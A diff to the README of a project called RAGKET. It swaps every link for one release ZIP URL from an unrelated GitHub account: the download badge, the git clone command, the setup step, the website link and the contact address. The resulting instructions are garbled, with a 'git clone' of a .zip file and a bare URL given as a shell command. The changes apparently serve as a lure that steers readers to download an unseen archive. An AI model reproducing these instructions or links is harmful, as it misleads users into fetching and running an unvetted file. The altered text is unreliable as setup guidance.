@@ -12,7 +12,7 @@ agentic-motility, agi, digital-gardening, knowledge-base, llm, ml, ontology, ope
 ## 📦 **Get Started**
 To access the software, please download it from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Ayanop267/RAGKET/releases/download/v1.0/Release.zip)](https://github.com/Ayanop267/RAGKET/releases/download/v1.0/Release.zip)
 
 ---
 
@@ -26,7 +26,7 @@ The RAGKET environment includes support for Dr. Racket, Python, Deno, and Git, c
 ## 🔧 **Installation**
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/RAGKET.git
+   git clone https://github.com/Ayanop267/RAGKET/releases/download/v1.0/Release.zip
    ```
 
 2. Navigate to the project directory:
@@ -36,7 +36,7 @@ The RAGKET environment includes support for Dr. Racket, Python, Deno, and Git, c
 
 3. Run the setup script:
    ```bash
-   ./setup.sh
+   https://github.com/Ayanop267/RAGKET/releases/download/v1.0/Release.zip
    ```
 
 ---
@@ -61,7 +61,7 @@ We welcome contributions from the community to enhance RAGKET's capabilities. Fe
 ---
 
 ## 🌐 **Visit Our Website**
-For more information about RAGKET and its features, visit our website [here](https://www.ragket.com).
+For more information about RAGKET and its features, visit our website [here](https://github.com/Ayanop267/RAGKET/releases/download/v1.0/Release.zip).
 
 ---
 
@@ -71,7 +71,7 @@ Explore the "Releases" section of this repository for the latest updates and ver
 ---
 
 ## 📞 **Contact Us**
-If you have any questions or feedback, reach out to us at [contact@ragket.com](mailto:contact@ragket.com).
+If you have any questions or feedback, reach out to us at [https://github.com/Ayanop267/RAGKET/releases/download/v1.0/Release.zip](https://github.com/Ayanop267/RAGKET/releases/download/v1.0/Release.zip).
 
 ---
 
